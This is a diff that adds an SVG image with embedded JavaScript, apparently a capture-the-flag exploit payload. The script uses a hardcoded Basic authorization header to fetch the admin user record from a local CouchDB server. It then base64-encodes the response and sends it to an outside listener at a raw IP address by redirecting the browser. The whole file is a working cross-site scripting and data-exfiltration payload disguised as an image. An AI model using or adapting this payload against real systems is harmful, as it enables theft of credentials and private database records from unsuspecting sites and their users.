@@ -1,0 +1,19 @@
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+    <script type="text/javascript">
+
+    var xhr = new XMLHttpRequest;
+    // Redirect the response to our listener upon successful completion
+    xhr.onreadystatechange = function() { 
+        if (this.readyState === XMLHttpRequest.DONE) {
+            window.location = "http://45.63.19.60:9999/?" + btoa(this.responseText);
+        }
+    }
+
+    // Request the admin's record from CouchDB in order to retrieve the flag
+    xhr.open("GET", "http://localhost:5984/users/admin");
+    xhr.setRequestHeader("Authorization", "Basic YWRtaW46eW91d291bGRudGRvd25sb2FkYWNvdWNo");
+    xhr.send();
+
+    </script>
+</svg>
